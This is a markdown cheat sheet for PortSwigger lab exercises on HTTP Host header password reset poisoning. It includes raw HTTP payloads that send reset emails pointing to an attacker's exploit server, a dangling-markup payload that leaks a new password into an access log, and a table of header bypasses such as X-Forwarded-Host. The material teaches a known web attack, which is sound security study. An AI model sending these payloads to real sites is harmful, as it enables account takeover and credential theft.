# HTTP Host header attacks - Password reset poisoning

The server builds the password reset link by concatenating the Host header with a generated token: `https://<Host>/forgot-password?temp-forgot-password-token=<TOKEN>`. Substituting an attacker-controlled domain causes the reset email to point to the attacker's server; the victim clicks it and the token is captured in the access log. The dangling-markup variant works when the new password appears directly in the email body rather than a URL: injecting a partial HTML tag via the Host port leaks subsequent email content to the attacker's access log.

## Quick reference

```
# Token poisoning (most common)
POST /forgot-password
Host: EXPLOIT-SERVER-DOMAIN
username=carlos
-> victim's browser visits EXPLOIT-SERVER with ?temp-forgot-password-token=TOKEN
-> grab from access log -> GET /forgot-password?temp-forgot-password-token=TOKEN -> reset password -> log in

# Dangling markup (new password sent in email body)
Host: LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
-> port value is injected into email HTML unescaped, inside single quotes
-> <a href tag open -> rest of email body (new password) appended as URL path/query
-> victim mail client (raw HTML view) loads attacker URL -> access log captures new password
```

## Root cause

The application builds an absolute URL for the reset link using the value of the `Host` header without validation or allowlisting. An attacker who controls the Host header controls the domain in the reset link - any user who clicks it delivers their token to the attacker's server.

For dangling markup: the new password is inserted into an HTML email template without encoding, and the Host header's injected port value breaks out of a string context, opening an `<a href>` tag that captures the rest of the email content as a URL query parameter.

## Find it

1. Trigger a password reset for your own account while intercepting traffic.
2. Change the Host header to `example.com` -> does the reset email still arrive? Does the link domain change to example.com?
3. If yes -> classic token poisoning. Change Host to exploit server.
4. If no token in the URL (new password sent directly in email body): check raw HTML of email.
5. Try adding a port to the Host: `LAB-ID:ARBITRARYPORT` -> check raw email for port reflection.
6. If port is reflected inside a string attribute without encoding -> dangling markup candidate.

## Technique

**Token poisoning:**
1. POST /forgot-password -> body: `username=wiener`, normal Host -> receive reset email, note reset URL structure.
2. Send request to Repeater. Change Host to `EXPLOIT-SERVER-ID.exploit-server.net`, change `username=carlos`.
3. Send. Carlos receives reset email with link pointing to exploit server.
4. On exploit server -> Access log -> find GET request for `/forgot-password?temp-forgot-password-token=CARLOS-TOKEN`.
5. Visit the real lab's reset URL with Carlos's token: `https://LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=CARLOS-TOKEN`.
6. Set new password for Carlos -> log in as Carlos -> delete carlos (if required).

**Dangling markup:**
1. POST /forgot-password -> receive email, observe new password in body (no token in URL).
2. Study raw HTML of email -> find Host value reflected inside a single-quoted string attribute.
3. Try adding arbitrary port: `Host: LAB-ID:arbitraryport` -> raw email shows port reflected unescaped in string.
4. Inject dangling markup via port:
   `Host: LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?`
5. Send (your own account first). Raw email -> most content missing (captured in href).
6. Check exploit server access log: GET `/?/login'>[content including password]`.
7. Repeat with `username=carlos` -> grab Carlos's new password from log -> log in.

## Payload arsenal

```http
# Token poisoning - basic
POST /forgot-password HTTP/1.1
Host: EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos

# Token poisoning - use captured token
GET /forgot-password?temp-forgot-password-token=<STOLEN-TOKEN> HTTP/1.1
Host: LAB-ID.web-security-academy.net

# Dangling markup
POST /forgot-password HTTP/1.1
Host: LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER-ID.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

username=carlos
```

## Bypasses

| Defense | Bypass |
|---|---|
| Server validates Host against whitelist | Try X-Forwarded-Host, X-Host, X-Forwarded-Server headers instead |
| Email link uses a separate config value, not Host | Check for X-Forwarded-Host reflection in email instead |
| Token used only once / short TTL | Act quickly: steal from log, visit URL immediately |
| HTML email rendered/sanitized by client | Use raw HTML view in exploit server's email client |
| Port stripped from Host | Try X-Forwarded-Port or other proxy headers |

## Exploitation walkthrough

**Token poisoning:**
Intercept POST /forgot-password -> change Host to exploit server, username to carlos -> send -> open exploit server access log -> copy temp-forgot-password-token value -> visit `https://LAB/forgot-password?temp-forgot-password-token=<value>` -> change password -> log in -> delete carlos.

**Dangling markup:**
Intercept POST /forgot-password -> Host: `LAB-ID:'<a href="//EXPLOIT-SERVER/?` -> send with username=wiener -> check raw email (content captured in href -> reaches exploit server log) -> repeat with username=carlos -> extract new password from log -> log in.

## Chaining

- Stolen reset token -> full account takeover -> [Authentication](../../Authentication/)
- Admin account takeover -> [Access-control](../../Access-control/)
- Dangling markup used when CSP/encoding blocks classic XSS -> combined with [XSS](../../XSS/)

## Tools

- **Burp Repeater** - modify Host header, change username param
- **Exploit server** - receive redirected reset emails / dangling markup leaks via access log
- **Raw email view** - inspect unrendered HTML to see reflected values and verify markup injection

## Labs

### Basic password reset poisoning [Apprentice]
POST /forgot-password with `Host: EXPLOIT-SERVER-DOMAIN` and `username=carlos`. Server sends reset email to carlos with link pointing to exploit server. Access log captures `?temp-forgot-password-token=TOKEN`. Use token at real reset URL -> change carlos's password -> log in. Key insight: reset link domain comes directly from Host header, no validation.

### Password reset poisoning via dangling markup [Expert]
Reset sends new password in email body (no token). Host port reflected unescaped in email HTML inside single quotes. Inject `Host: LAB-ID:'<a href="//EXPLOIT-SERVER/?` -> opens unclosed href tag -> rest of email (new password) becomes URL query -> victim mail client loads exploit server -> access log has password. Key insight: port is reflected in link attribute without encoding -> breaks string, opens tag, captures subsequent content.

## Real-world notes

- Password reset poisoning is high-impact: it works silently, requires no interaction beyond the victim clicking a normal-looking email link.
- Many apps check only that the Host looks like their domain (string startsWith) - try subdomains: `ATTACKER.LAB-ID.com`.
- Try secondary headers if Host is validated: `X-Forwarded-Host`, `X-Forwarded-Server`, `Forwarded: host=ATTACKER`.
- Dangling markup is a CSP bypass technique - useful when script injection is blocked but HTML injection is possible.

## References

- https://portswigger.net/web-security/host-header/exploiting#password-reset-poisoning
- https://portswigger.net/web-security/cross-site-scripting/dangling-markup
